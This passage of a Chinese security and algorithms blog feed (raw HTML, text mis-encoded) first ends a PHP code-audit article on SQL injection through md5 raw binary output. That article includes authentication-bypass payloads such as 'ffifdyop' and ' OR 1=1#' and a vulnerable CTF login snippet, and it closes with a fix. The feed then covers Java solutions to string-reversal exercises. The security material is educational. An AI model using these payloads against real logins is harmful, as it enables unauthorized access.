class="string">&#x27;xxx#&#x27;</span></span><br></pre></td></tr></table></figure><p>å¦‚æœè¿™ç§æƒ…å†µå‘ç”Ÿï¼Œå®é™…ä¸Šä¹Ÿå­˜åœ¨äº†SQLæ³¨å…¥ã€‚æˆ‘ä»¬å°è¯•fuzzä¸€ä¸‹ï¼Œçœ‹çœ‹ä¼šä¸ä¼šå­˜åœ¨æŸä¸ªå€¼ç»è¿‡äº† <strong>md5(xxx, true)</strong> å¤„ç†ä¹‹åï¼Œæœ€åä¸€ä½æ˜¯åæ–œæ ã€‚</p><p><img src="/2024/10/16/WebSecurity/codeaudit/phpaudit5/image-11.png"></p><p>æˆ‘ä»¬é’ˆå¯¹1-1000è¿›è¡Œä¸€ä¸‹fuzzï¼Œå‘ç° <strong>md5(128, true)</strong> æœ€åçš„ç»“æœå¸¦æœ‰åæ–œæ ã€‚å› æ­¤è¿™é¢˜æœ€åçš„payloadå¦‚ä¸‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">user= OR 1=1#&amp;passwd=128</span><br></pre></td></tr></table></figure><p>å¸¦å…¥åˆ°æ•°æ®åº“æŸ¥è¯¢çš„è¯­å¥å¦‚ä¸‹ï¼š</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="built_in">count</span>(p) <span class="keyword">from</span> <span class="keyword">user</span> s <span class="keyword">where</span> password<span class="operator">=</span><span class="string">&#x27;vï¿½anï¿½ï¿½ï¿½lï¿½ï¿½ï¿½qï¿½ï¿½\&#x27;</span> <span class="keyword">and</span> <span class="keyword">user</span><span class="operator">=</span><span class="string">&#x27; OR 1=1#&#x27;</span></span><br></pre></td></tr></table></figure><p>æœ€åæˆ‘ä»¬ä¹‹å‰ <strong>Day13</strong> ä¹Ÿæ˜¯é€šè¿‡é€ƒé€¸åæ–œæ†ï¼Œè½¬ä¹‰å•å¼•å·ï¼Œä»è€Œé€ƒé€¸å‡ºä¸€ä¸ªå•å¼•å·é—­åˆäº†ä¹‹å‰çš„SQLè¯­å¥ï¼Œä¹‹å‰ <strong>Day13</strong> çš„payloadå¦‚ä¸‹æ‰€ç¤ºï¼š</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="built_in">count</span>(p) <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> <span class="keyword">user</span> <span class="operator">=</span> <span class="string">&#x27;1234567890123456789\&#x27;</span> <span class="keyword">AND</span> password <span class="operator">=</span> <span class="string">&#x27;or 1=1#&#x27;</span></span><br></pre></td></tr></table></figure><p>è¿™é‡Œä¹Ÿæ˜¯å› ä¸ºSQLè¯­å¥ä¸­æœ‰ä¸¤ä¸ªåœ°æ–¹å¯æ§ï¼Œå› æ­¤ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥é€šè¿‡è¿™ä¸ªåŠæ³•é€ æˆSQLæ³¨å…¥çš„é—®é¢˜ï¼Œæ‰€ä»¥æˆ‘æ‰ä¼šè¯´è¿™é“é¢˜å®é™…ä¸Šå’Œ <strong>Day13</strong> å¾ˆç›¸ä¼¼ã€‚</p><h3 id="å®ä¾‹åˆ†æ-2"><a href="#å®ä¾‹åˆ†æ-2" class="headerlink" title="å®ä¾‹åˆ†æ"></a>å®ä¾‹åˆ†æ</h3><p>ç”±äºæ‰¾ä¸åˆ°ç”± <strong>md5(xxx,true)</strong> å‡½æ•°å¼•èµ·çš„æ¼æ´å®ä¾‹ï¼Œæ‰€ä»¥æœ¬æ¬¡å®ä¾‹åˆ†æé€‰æ‹©å®éªŒå§çš„ä¸€é“CTFé¢˜ç›®ï¼Œè¿›è¡Œåˆ†æï¼Œ<a href="http://ctf5.shiyanbar.com/web/houtai/ffifdyop.php">é¢˜ç›®åœ°å€</a>ã€‚<br>é¦–å…ˆæ‰“å¼€è¯¥é¢˜ç›®æç¤ºåå°ç™»é™†ï¼ŒçŒœæµ‹å¯èƒ½æ˜¯ä¸ªæ³¨å…¥çš„é¢˜ç›®ï¼Œå…ˆçœ‹çœ‹æœ‰æ²¡æœ‰ç›¸å…³ä¿¡æ¯æ³„æ¼ï¼Œå³é”®æºä»£ç ï¼Œå‘ç°æ³„æ¼çš„ç™»é™†é€»è¾‘ä»£ç ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$password</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;SELECT * FROM admin WHERE username = &#x27;admin&#x27; and password = &#x27;&quot;</span>.<span class="title function_ invoke__">md5</span>(<span class="variable">$password</span>,<span class="literal">true</span>).<span class="string">&quot;&#x27;&quot;</span>;</span><br><span class="line"><span class="variable">$result</span>=<span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$link</span>,<span class="variable">$sql</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">mysqli_num_rows</span>(<span class="variable">$result</span>)&gt;<span class="number">0</span>)&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;flag is :&#x27;</span>.<span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;å¯†ç é”™è¯¯!&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä»ä¸Šå›¾ä¸­çš„ä»£ç ä¸­çš„ <strong>ç¬¬5è¡Œ</strong> å¯ä»¥çœ‹åˆ°ï¼Œå½“æŸ¥è¯¢ç»“æœè¿”å›å¤§äº0çš„æ—¶å€™ï¼Œå°±ä¼šè¾“å‡º <strong>flag</strong> ï¼Œæˆ‘ä»¬å‰é¢åˆ†æè¿‡å½“ <strong>md5</strong> å‡½æ•°çš„ <strong>$raw_output</strong> è®¾ç½®ä¼štrueçš„æ—¶å€™ï¼Œ <strong>md5</strong> å‡½æ•°è¿”å›å‰16å­—èŠ‚é•¿åº¦çš„åŸå§‹äºŒè¿›åˆ¶ï¼Œç„¶åå†å°†äºŒè¿›åˆ¶è½¬æ¢æˆå­—ç¬¦ä¸²ï¼Œè¿™ç§æƒ…å†µä¸‹å¯èƒ½ä¼šå¼•å…¥å•å¼•å·ç­‰ç‰¹æ®Šå­—ç¬¦ã€‚</p><p>æœ‰äººå°è¯•è¿‡ç ´è§£è¿™ä¸ªç±»å‹çš„å­—ç¬¦ï¼Œç›®å‰å·²çŸ¥ä¸¤ä¸ªæ˜¯ <strong>ffifdyop</strong> å’Œ<strong>129581926211651571912466741651878684928</strong> ï¼Œæˆ‘ä»¬æ¥çœ‹çœ‹å®é™…æ•ˆæœã€‚</p><p><img src="/2024/10/16/WebSecurity/codeaudit/phpaudit5/image-12.png"></p><p>æ‰€ä»¥å®é™…ä¸Šè¿™é‡Œå°±ä¼šå¯¼è‡´äº†SQLæ³¨å…¥</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">åŸå…ˆï¼š<span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> admin <span class="keyword">WHERE</span> username <span class="operator">=</span> <span class="string">&#x27;admin&#x27;</span> <span class="keyword">and</span> password <span class="operator">=</span> <span class="string">&#x27;md5($password,true)&#x27;</span></span><br><span class="line">å˜æˆï¼š<span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> admin <span class="keyword">WHERE</span> username <span class="operator">=</span> <span class="string">&#x27;admin&#x27;</span> <span class="keyword">and</span> password <span class="operator">=</span> <span class="string">&#x27;&#x27;</span><span class="keyword">or</span><span class="string">&#x27;6\xc9]\x99&#x27;</span></span><br></pre></td></tr></table></figure><p>ç”±äº <strong>and</strong> è¿ç®—ç¬¦ä¼˜å…ˆçº§æ¯” <strong>or</strong> é«˜ï¼Œæ‰€ä»¥å‰é¢çš„ï¼š<strong>username &#x3D; â€˜adminâ€™ and password &#x3D; â€˜â€™</strong> ä¼šå…ˆæ‰§è¡Œï¼Œç„¶åå°†æ‰§è¡Œç»“æœä¸åé¢çš„ <strong>â€˜6\xc9]\x99â€™</strong> è¿›è¡Œ <strong>or</strong> è¿ç®—ã€‚åœ¨å¸ƒå°”è¿ç®—ä¸­ï¼Œé™¤äº† <strong>0ã€â€™0â€™ã€falseã€null</strong> ï¼Œå…¶ä½™ç»“æœéƒ½ä¸ºçœŸã€‚æ‰€ä»¥æ•´ä¸ª <strong>SQL</strong> è¯­å¥çš„ <strong>where</strong> æ¡ä»¶åˆ¤æ–­éƒ¨åˆ†ä¸ºçœŸï¼Œè¿™æ ·å¯å®šå°±èƒ½æŸ¥å‡ºæ•°æ®ï¼Œç±»ä¼¼å¦‚ä¸‹ï¼š</p><p><img src="/2024/10/16/WebSecurity/codeaudit/phpaudit5/image-13.png"></p><h3 id="ä¿®å¤å»ºè®®-2"><a href="#ä¿®å¤å»ºè®®-2" class="headerlink" title="ä¿®å¤å»ºè®®"></a>ä¿®å¤å»ºè®®</h3><p>å»ºè®®åœ¨ä½¿ç”¨ <strong>md5</strong> å‡½æ•°çš„æ—¶å€™ï¼Œä¸è¦å°† <strong>$raw_output</strong> å­—æ®µè®¾ç½®ä¸º<strong>true</strong> ã€‚</p><p><a href="http://cvk.posthaven.com/sql-injection-with-raw-md5-hashes">http://cvk.posthaven.com/sql-injection-with-raw-md5-hashes</a></p>]]></content>
      
      
      <categories>
          
          <category> Code Audit </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ä»£ç å®¡è®¡ </tag>
            
            <tag> PHP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ã€ç®—æ³•ã€‘å­—ç¬¦ä¸²</title>
      <link href="/2024/10/16/algorithm/string/"/>
      <url>/2024/10/16/algorithm/string/</url>
      
        <content type="html"><![CDATA[<h2 id="344-åè½¬å­—ç¬¦ä¸²"><a href="#344-åè½¬å­—ç¬¦ä¸²" class="headerlink" title="344.åè½¬å­—ç¬¦ä¸²"></a>344.åè½¬å­—ç¬¦ä¸²</h2><p>ç¼–å†™ä¸€ä¸ªå‡½æ•°ï¼Œå…¶ä½œç”¨æ˜¯å°†è¾“å…¥çš„å­—ç¬¦ä¸²åè½¬è¿‡æ¥ã€‚è¾“å…¥å­—ç¬¦ä¸²ä»¥å­—ç¬¦æ•°ç»„ s çš„å½¢å¼ç»™å‡ºã€‚<br>ä¸è¦ç»™å¦å¤–çš„æ•°ç»„åˆ†é…é¢å¤–çš„ç©ºé—´ï¼Œä½ å¿…é¡»åŸåœ°ä¿®æ”¹è¾“å…¥æ•°ç»„ã€ä½¿ç”¨ O(1) çš„é¢å¤–ç©ºé—´è§£å†³è¿™ä¸€é—®é¢˜ã€‚</p><p>ç¤ºä¾‹ 1ï¼š<br>è¾“å…¥ï¼šs &#x3D; [â€œhâ€,â€eâ€,â€lâ€,â€lâ€,â€oâ€]<br>è¾“å‡ºï¼š[â€œoâ€,â€lâ€,â€lâ€,â€eâ€,â€hâ€]</p><p>ç¤ºä¾‹ 2ï¼š<br>è¾“å…¥ï¼šs &#x3D; [â€œHâ€,â€aâ€,â€nâ€,â€nâ€,â€aâ€,â€hâ€]<br>è¾“å‡ºï¼š[â€œhâ€,â€aâ€,â€nâ€,â€nâ€,â€aâ€,â€Hâ€]</p><p>ä½¿ç”¨åŒæŒ‡é’ˆè§£å†³è¿™ä¸ªé—®é¢˜,åŒæ—¶å¯ä»¥ç”¨å¼‚æˆ–æ¥äº¤æ¢æ•°å€¼</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">reverseString</span><span class="params">(<span class="type">char</span>[] s)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">l</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">r</span> <span class="operator">=</span> s.length - <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">while</span>(l &lt; r)&#123;</span><br><span class="line">            s[l] ^= s[r];</span><br><span class="line">            s[r] ^= s[l];</span><br><span class="line">            s[l] ^= s[r];</span><br><span class="line">            l++;</span><br><span class="line">            r--;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="541-åè½¬å­—ç¬¦ä¸²II"><a href="#541-åè½¬å­—ç¬¦ä¸²II" class="headerlink" title="541. åè½¬å­—ç¬¦ä¸²II"></a>541. åè½¬å­—ç¬¦ä¸²II</h2><p>ç»™å®šä¸€ä¸ªå­—ç¬¦ä¸² s å’Œä¸€ä¸ªæ•´æ•° kï¼Œä»å­—ç¬¦ä¸²å¼€å¤´ç®—èµ·, æ¯è®¡æ•°è‡³ 2k ä¸ªå­—ç¬¦ï¼Œå°±åè½¬è¿™ 2k ä¸ªå­—ç¬¦ä¸­çš„å‰ k ä¸ªå­—ç¬¦ã€‚<br>å¦‚æœå‰©ä½™å­—ç¬¦å°‘äº k ä¸ªï¼Œåˆ™å°†å‰©ä½™å­—ç¬¦å…¨éƒ¨åè½¬ã€‚</p><p>å¦‚æœå‰©ä½™å­—ç¬¦å°äº 2k ä½†å¤§äºæˆ–ç­‰äº k ä¸ªï¼Œåˆ™åè½¬å‰ k ä¸ªå­—ç¬¦ï¼Œå…¶ä½™å­—ç¬¦ä¿æŒåŸæ ·ã€‚</p><p>ç¤ºä¾‹:<br>è¾“å…¥: s &#x3D; â€œabcdefgâ€, k &#x3D; 2<br>è¾“å‡º: â€œbacdfegâ€</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">reverseStr</span><span class="params">(String s, <span class="type">int</span> k)</span> &#123;</span><br><span class="line">        <span class="type">StringBuffer</span> <span class="variable">res</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuffer</span>();</span><br><span class="line">        <span class="type">int</span> <span class="variable">length</span> <span class="operator">=</span> s.length();</span><br><span class="line">        <span class="type">int</span> <span class="variable">start</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span>(start &lt; length)&#123;</span><br><span class="line">            <span class="type">StringBuffer</span> <span class="variable">temp</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuffer</span>();</span><br><span class="line">            <span class="comment">// ä¸lengthè¿›è¡Œåˆ¤æ–­,,å¦‚æœå¤§äº†å°±å°†å…¶ç½®ä¸ºlength</span></span><br><span class="line">            <span class="type">int</span> <span class="variable">firstK</span> <span class="operator">=</span> (start + k &gt; length) ? length : start + k;</span><br><span class="line">            <span class="type">int</span> <span class="variable">secondK</span> <span class="operator">=</span> (start + (<span class="number">2</span>*k) &gt; length) ? length : start + (<span class="number">2</span>*k);</span><br><span class="line">            <span class="comment">// æ— è®ºstartçš„ä½ç½®,è‡³å°‘ä¼šåè½¬ä¸€æ¬¡</span></span><br><span class="line">            temp.append(s.substring(start, firstK));</span><br><span class="line">            res.append(temp.reverse());</span><br><span class="line">            <span class="comment">// å¦‚æœfirstKåˆ°secondKä¹‹é—´æœ‰å…ƒç´ ,è¿™äº›å…ƒç´ ç›´æ¥æ”¾å…¥resé‡Œ</span></span><br><span class="line">            <span class="keyword">if</span>(firstK &lt; secondK)&#123;</span><br><span class="line">                res.append(s.substring(firstK, secondK));</span><br><span class="line">            &#125;</span><br><span class="line">            start += (<span class="number">2</span>*k);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res.toString();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// æ¯éš”2kä¸ªåè½¬å‰kä¸ª</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">reverseStr</span><span class="params">(String s, <span class="type">int</span> k)</span> &#123;</span><br><span class="line">        <span class="type">char</span>[] ch = s.toCharArray();</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; ch.length; i+=<span class="number">2</span>*k)&#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">start</span> <span class="operator">=</span> i;</span><br><span class="line">            <span class="type">int</span> <span class="variable">end</span> <span class="operator">=</span> Math.min(ch.length-<span class="number">1</span>,start+k-<span class="number">1</span>);</span><br><span class="line">            <span class="keyword">while</span>(start &lt; end)&#123;</span><br><span class="line">                ch[start] ^= ch[end];</span><br><span class="line">                ch[end] ^= ch[start];</span><br><span class="line">                ch[start] ^= ch[end];</span><br><span class="line">                start++;</span><br><span class="line">                end--;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">String</span>(ch);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="æ›¿æ¢æ•°å­—"><a href="#æ›¿æ¢æ•°å­—" class="headerlink" title="æ›¿æ¢æ•°å­—"></a>æ›¿æ¢æ•°å­—</h2><p>ç»™å®šä¸€ä¸ªå­—ç¬¦ä¸² sï¼Œå®ƒåŒ…å«å°å†™å­—æ¯å’Œæ•°å­—å­—ç¬¦ï¼Œè¯·ç¼–å†™ä¸€ä¸ªå‡½æ•°ï¼Œå°†å­—ç¬¦ä¸²ä¸­çš„å­—æ¯å­—ç¬¦ä¿æŒä¸å˜ï¼Œè€Œå°†æ¯ä¸ªæ•°å­—å­—ç¬¦æ›¿æ¢ä¸ºnumberã€‚<br>ä¾‹å¦‚ï¼Œå¯¹äºè¾“å…¥å­—ç¬¦ä¸² â€œa1b2c3â€ï¼Œå‡½æ•°åº”è¯¥å°†å…¶è½¬æ¢ä¸º â€œanumberbnumbercnumberâ€ã€‚<br>å¯¹äºè¾“å…¥å­—ç¬¦ä¸² â€œa5bâ€ï¼Œå‡½æ•°åº”è¯¥å°†å…¶è½¬æ¢ä¸º â€œanumberbâ€<br>è¾“å…¥ï¼šä¸€ä¸ªå­—ç¬¦ä¸² s,s ä»…åŒ…å«å°å†™å­—æ¯å’Œæ•°å­—å­—ç¬¦ã€‚<br>è¾“å‡ºï¼šæ‰“å°ä¸€ä¸ªæ–°çš„å­—ç¬¦ä¸²ï¼Œå…¶ä¸­æ¯ä¸ªæ•°å­—å­—ç¬¦éƒ½è¢«æ›¿æ¢ä¸ºäº†number<br>æ ·ä¾‹è¾“å…¥ï¼ša1b2c3<br>æ ·ä¾‹è¾“å‡ºï¼šanumberbnumbercnumber<br>æ•°æ®èŒƒå›´ï¼š1 &lt;&#x3D; s.length &lt; 10000</p><p>å¦‚æœæƒ³æŠŠè¿™é“é¢˜ç›®åšåˆ°æè‡´ï¼Œå°±ä¸è¦åªç”¨é¢å¤–çš„è¾…åŠ©ç©ºé—´äº†ï¼ ï¼ˆä¸è¿‡ä½¿ç”¨Javaåˆ·é¢˜çš„å½•å‹ï¼Œä¸€å®šè¦ä½¿ç”¨è¾…åŠ©ç©ºé—´ï¼Œå› ä¸ºJavaé‡Œçš„stringä¸èƒ½ä¿®æ”¹ï¼‰<br>é¦–å…ˆæ‰©å……æ•°ç»„åˆ°æ¯ä¸ªæ•°å­—å­—ç¬¦æ›¿æ¢æˆ â€œnumberâ€ ä¹‹åçš„å¤§å°ã€‚<br>ä¾‹å¦‚ å­—ç¬¦ä¸² â€œa5bâ€ çš„é•¿åº¦ä¸º3ï¼Œé‚£ä¹ˆ å°† æ•°å­—å­—ç¬¦å˜æˆå­—ç¬¦ä¸² â€œnumberâ€ ä¹‹åçš„å­—ç¬¦ä¸²ä¸º â€œanumberbâ€ é•¿åº¦ä¸º 8ã€‚<br><img src="/2024/10/16/algorithm/string/image.png"><br>ç„¶åä»åå‘å‰æ›¿æ¢æ•°å­—å­—ç¬¦ï¼Œä¹Ÿå°±æ˜¯åŒæŒ‡é’ˆæ³•ï¼Œè¿‡ç¨‹å¦‚ä¸‹ï¼šiæŒ‡å‘æ–°é•¿åº¦çš„æœ«å°¾ï¼ŒjæŒ‡å‘æ—§é•¿åº¦çš„æœ«å°¾ã€‚<br><img src="/2024/10/16/algorithm/string/image-1.png"><br>æœ‰åŒå­¦é—®äº†ï¼Œä¸ºä»€ä¹ˆè¦ä»åå‘å‰å¡«å……ï¼Œä»å‰å‘åå¡«å……ä¸è¡Œä¹ˆï¼Ÿ<br>ä»å‰å‘åå¡«å……å°±æ˜¯O(n^2)çš„ç®—æ³•äº†ï¼Œå› ä¸ºæ¯æ¬¡æ·»åŠ å…ƒç´ éƒ½è¦å°†æ·»åŠ å…ƒç´ ä¹‹åçš„æ‰€æœ‰å…ƒç´ æ•´ä½“å‘åç§»åŠ¨ã€‚<br>å…¶å®å¾ˆå¤šæ•°ç»„å¡«å……ç±»çš„é—®é¢˜ï¼Œå…¶åšæ³•éƒ½æ˜¯å…ˆé¢„å…ˆç»™æ•°ç»„æ‰©å®¹å¸¦å¡«å……åçš„å¤§å°ï¼Œç„¶ååœ¨ä»åå‘å‰è¿›è¡Œæ“ä½œã€‚</p><p>è¿™ä¹ˆåšæœ‰ä¸¤ä¸ªå¥½å¤„ï¼š</p><ol><li>ä¸ç”¨ç”³è¯·æ–°æ•°ç»„ã€‚</li><li>ä»åå‘å‰å¡«å……å…ƒç´ ï¼Œé¿å…äº†ä»å‰å‘åå¡«å……å…ƒç´ æ—¶ï¼Œæ¯æ¬¡æ·»åŠ å…ƒç´ éƒ½è¦å°†æ·»åŠ å…ƒç´ ä¹‹åçš„æ‰€æœ‰å…ƒç´ å‘åç§»åŠ¨çš„é—®é¢˜ã€‚</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">replaceNumber</span><span class="params">(String s)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">count</span> <span class="operator">=</span> <span class="number">0</span>; <span class="comment">// ç»Ÿè®¡æ•°å­—çš„ä¸ªæ•°</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">sOldSize</span> <span class="operator">=</span> s.length();</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; s.length(); i++) &#123;</span><br><span class="line">            <span class="keyword">if</span>(Character.isDigit(s.charAt(i)))&#123;</span><br><span class="line">                count++;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// æ‰©å……å­—ç¬¦ä¸²sçš„å¤§å°ï¼Œä¹Ÿå°±æ˜¯æ¯ä¸ªç©ºæ ¼æ›¿æ¢æˆ&quot;number&quot;ä¹‹åçš„å¤§å°</span></span><br><span class="line">        <span class="type">char</span>[] newS = <span class="keyword">new</span> <span class="title class_">char</span>[s.length() + count * <span class="number">5</span>];</span><br><span class="line">        <span class="type">int</span> <span class="variable">sNewSize</span> <span class="operator">=</span> newS.length;</span><br><span class="line">        <span class="comment">// å°†æ—§å­—ç¬¦ä¸²çš„å†…å®¹å¡«å…¥æ–°æ•°ç»„</span></span><br><span class="line">        System.arraycopy(s.toCharArray(), <span class="number">0</span>, newS, <span class="number">0</span>, sOldSize);</span><br><span class="line">        <span class="comment">// ä»åå…ˆå‰å°†ç©ºæ ¼æ›¿æ¢ä¸º&quot;number&quot;</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> sNewSize - <span class="number">1</span>, j = sOldSize - <span class="number">1</span>; j &lt; i; j--, i--) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!Character.isDigit(newS[j])) &#123;</span><br><span class="line">                newS[i] = newS[j];</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                newS[i] = <span class="string">&#x27;r&#x27;</span>;</span><br><span class="line">                newS[i - <span class="number">1</span>] = <span class="string">&#x27;e&#x27;</span>;</span><br><span class="line">                newS[i - <span class="number">2</span>] = <span class="string">&#x27;b&#x27;</span>;</span><br><span class="line">                newS[i - <span class="number">3</span>] = <span class="string">&#x27;m&#x27;</span>;</span><br><span class="line">                newS[i - <span class="number">4</span>] = <span class="string">&#x27;u&#x27;</span>;</span><br><span class="line">                newS[i - <span class="number">5</span>] = <span class="string">&#x27;n&#x27;</span>;</span><br><span class="line">                i -= <span class="number">5</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">String</span>(newS);</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Scanner</span> <span class="variable">scanner</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(System.in);</span><br><span class="line">        <span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> scanner.next();</span><br><span class="line">        System.out.println(replaceNumber(s));</span><br><span class="line">        scanner.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ä¸ºäº†è¿˜åŸé¢˜ç›®æœ¬æ„ï¼Œå…ˆæŠŠåŸæ•°ç»„å¤åˆ¶åˆ°æ‰©å±•é•¿åº¦åçš„æ–°æ•°ç»„ï¼Œç„¶åä¸å†ä½¿ç”¨åŸæ•°ç»„ã€åŸåœ°å¯¹æ–°æ•°ç»„è¿›è¡Œæ“ä½œã€‚</span></span><br><span class="line"><span class="keyword">import</span> java.util.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Scanner</span> <span 